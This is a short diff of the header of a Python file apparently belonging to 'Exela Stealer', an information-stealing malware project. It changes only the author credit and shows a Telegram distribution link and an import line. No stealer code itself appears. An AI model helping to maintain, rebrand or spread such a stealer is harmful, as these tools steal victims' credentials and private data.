@@ -1,5 +1,5 @@
 # Exela Stealer All Rights Recieved
-# Coded by quicaxd
+# Coded by quicaxd, Modified by Galaxyfounded
 # https://t.me/ExelaStealer
 
 import ctypes, platform
